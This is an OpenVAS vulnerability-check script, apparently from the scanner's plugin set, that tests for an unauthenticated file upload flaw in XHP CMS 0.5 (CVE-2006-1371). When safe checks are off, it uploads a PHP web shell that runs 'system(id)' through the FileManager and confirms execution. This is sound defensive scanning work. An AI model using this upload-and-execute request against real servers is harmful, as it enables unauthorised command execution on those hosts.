# OpenVAS Vulnerability Test
# $Id: xhp_cms_file_upload.nasl 16 2013-10-27 13:09:52Z jan $
# Description: XHP CMS Version <= 0.5 File Upload Vulnerability
#
# Authors:
# Ferdy Riphagen
#
# Copyright:
# Copyright (C) 2006 Ferdy Riphagen
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2,
# as published by the Free Software Foundation
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
#

include("revisions-lib.inc");
tag_summary = "The remote webserver is hosting a PHP script which 
is vulnerable to a unrestricted file upload flaw. 

Description :

XHP CMS is installed on the remote system.  
The installed application does not authenticate users to access 
the FileManager scripts located at: 

'/inc/htmlarea/plugins/FileManager/manager.php'

and

'/inc/htmlarea/plugins/FileManager/standalonemanager.php' 

This allows an attacker to upload content to the webserver, and
execute arbitrary commands with privileges of the webserver account.";

tag_solution = "Upgrade to version 0.51 or a newer release.";

# Original advisory by : rgod
# http://retrogod.altervista.org/XHP_CMS_05_xpl.html

desc = "
 Summary:
 " + tag_summary + "
Solution:
" + tag_solution;script_description(desc);

if (description) {
 script_id(200100);
 script_version("$Revision: 16 $");
 script_tag(name:"last_modification", value:"$Date: 2013-10-27 14:09:52 +0100 (Sun, 27 Oct 2013) $");
 script_tag(name:"creation_date", value:"2008-08-22 16:09:14 +0200 (Fri, 22 Aug 2008)");
 script_tag(name:"cvss_base", value:"9.0");
 script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:S/C:C/I:C/A:C");
 script_tag(name:"risk_factor", value:"Critical");

 script_cve_id("CVE-2006-1371");
 script_bugtraq_id(17209);
 script_xref(name:"OSVDB", value:"24058");
 script_xref(name:"OSVDB", value:"24059"); 

 name = "XHP CMS Version <= 0.5 File Upload Vulnerability";
 script_name(name);
 summary = "Checks for a arbitrary file upload and execution flaws";
 script_summary(summary);

 script_category(ACT_DESTRUCTIVE_ATTACK);
 script_family("Web application abuses");
 script_copyright("This script is Copyright (C) 2006 Ferdy Riphagen");

 script_dependencies("http_version.nasl");
 script_require_ports("Services/www", 80);
 script_exclude_keys("Settings/disable_cgi_scanning");
if (revcomp(a: OPENVAS_VERSION, b: "6.0+beta5") >= 0) {
  script_tag(name : "solution" , value : tag_solution);
   script_tag(name : "summary" , value : tag_summary);
}
 script_xref(name : "URL" , value : "http://www.securityfocus.com/bid/17209");
 script_xref(name : "URL" , value : "http://xhp.targetit.ro/index.php?page=3&amp;box_id=34&amp;action=show_single_entry&amp;post_id=10");
 exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("global_settings.inc");

port = get_http_port(default:80);
if (!get_port_state(port)) exit(0);
if (!can_host_php(port:port)) exit(0);

if (thorough_tests) dirs = make_list("/xhp", "/xhpcms", cgi_dirs()); 
else dirs = make_list("/test/xhp", cgi_dirs());

foreach dir (dirs) {
 res = http_get_cache(item:string(dir, "/inc/htmlarea/plugins/FileManager/standalonemanager.php"), port:port);
 if ("XHP File Manager" >!< res) exit(0);

 if (!safe_checks()) { 
  rand = rand();
  file = string("DELETE_FILE_", rand, ".php"); 
  content = "<?php system(id); ?>"; 

  exp = string(
	"--", rand, "\r\n",
	'Content-Disposition: form-data; name="dir"', "\r\n\r\n",
	"/\r\n",
	"--", rand, "\r\n",
	'Content-Disposition: form-data; name="upload"; filename="', file, '"', "\r\n",
	"Content-Type: text/plain\r\n\r\n",
	content, "\r\n",
	"--", rand, "\r\n",
 	'Content-Disposition: form-data; name="submit"', "\r\n\r\n",
	"Upload\r\n",
	"--", rand, "--\r\n");

  req = string(  
	"POST ", dir, "/inc/htmlarea/plugins/FileManager/images.php HTTP/1.1\r\n",
	"Content-Type: multipart/form-data; boundary=", rand, "\r\n",
	"Host: ", get_host_name(), "\r\n",
	"Content-Length: ", strlen(exp), "\r\n",
	"Connection: close\r\n\r\n",
	 exp); 
  recv = http_keepalive_send_recv(data:req, port:port, bodyonly:TRUE);

  req2 = http_get(item:string(dir, "/filemanager/", file), port:port);
  recv2 = http_keepalive_send_recv(data:req2, port:port, bodyonly:TRUE);
  
  if (recv2 == NULL) exit(0);
  if(egrep(pattern:"uid=[0-9]+.*gid=[0-9]+", string:recv2)) {
   report = string( 
	desc, "\n\n",
	"Note :\n\n",
	"## It was possible to upload and execute a file on the remote webserver.\n",
	"## The file is placed in directory: ", '"', dir, "/filemanager/", '"', "\n",
	"## and is named: ", '"', file, '"', "\n\n",
	"## You should delete this file as soon as possible !!!\n"); 

   security_hole(port:port, data:report);
   exit(0);
  }
 }
 else {
  req = http_get_cache(item:string(dir, "/index.php"), port:port);
  
 if (egrep(pattern:"<a href[^>]+>Powered by XHP CMS v0\.(4\.1|5)", string:req)) {
   security_hole(port:port, data:desc);
   exit(0);
  }
 }
} 
